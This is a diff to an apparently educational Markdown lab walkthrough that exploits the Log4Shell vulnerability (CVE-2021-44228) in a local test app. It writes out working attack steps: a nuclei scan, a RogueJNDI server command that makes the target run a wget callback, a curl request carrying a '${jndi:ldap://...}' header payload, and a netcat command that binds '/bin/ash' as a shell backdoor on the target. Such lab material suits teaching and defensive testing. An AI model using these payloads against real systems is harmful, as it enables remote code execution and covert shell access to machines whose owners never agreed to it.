@@ -55,13 +55,13 @@ Now let's test if the server will tell us its hostname. Replace "your-private-ip
 
 ```bash
 docker run -it --rm --entrypoint bin/ash nuclei
-nuclei -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://your-private-ip:8080
+nuclei -duc -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://your-private-ip:8080
 ```
 
 If the remote server is vulnerable to the log4shell bug, it will give you an output like following. The last element in the output (8dc4a6fbe91b) is the remote server's hostname.
 
 ```bash
-$> nuclei -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://192.168.1.126:8080
+$> nuclei -duc -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://192.168.1.126:8080
                      __     _
    ____  __  _______/ /__  (_)
   / __ \/ / / / ___/ / _ \/ /
@@ -88,27 +88,47 @@ The JNDI Server (RogueJNDI) will run a JNDI server (port 1389) and a http server
 
 ## Run the JNDI server
 
+Start a new console and run the following commands. This will start two servers listening on separate ports.
+1. LDAP Server, port  1389
+2. Web Server, port 8000
+The web server will serve the code to execute. The LDAP server will tell the vulnerable app where to load the code to execute.
+
 ```bash
 cd rogue-jndi
 mvn compile package
 java -jar target/RogueJndi-1.1.jar -c "wget http://your-private-ip:8000/callback/gugus"
 ```
 
+```bash
+java -jar target/RogueJndi-1.1.jar -c "wget http://192.168.1.126:8000/callback/gugus"
+```
+
 ## Issue simple attack
+
+Call the vulnerable app (on 127.0.0.1:8080) to load remote code from your jndi server (jndi:ldap://your-private-ip:1389). The code is referenced by the path (/o=reference).
+Replace the code to be executed as you wish. You'll find it in the following file:
+rogue-jndi/src/main/java/artsploit/ExportObject.java
 
 ```bash
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
 ```
 
-## Backdoor
+```bash
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.126:1389/o=reference}'
+```
 
-Start the jndi server with the following command
+
+
+## Backdoor
+Let's start a backdor using netcat (nc) on the vulnerable app server.
+
+Restart the jndi server with the following command.
 
 ```bash
 java -jar target/RogueJndi-1.1.jar -c "nc -vv -l -p 3001 -e /bin/ash"
 ```
 
-Start the nc server on the vulnerable app
+Start the remote nc server on the vulnerable app
 
 ```bash
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
@@ -125,6 +145,7 @@ Run some commands
 ```
 ls
 uname -r
+ls /app
 ```
 
 # References
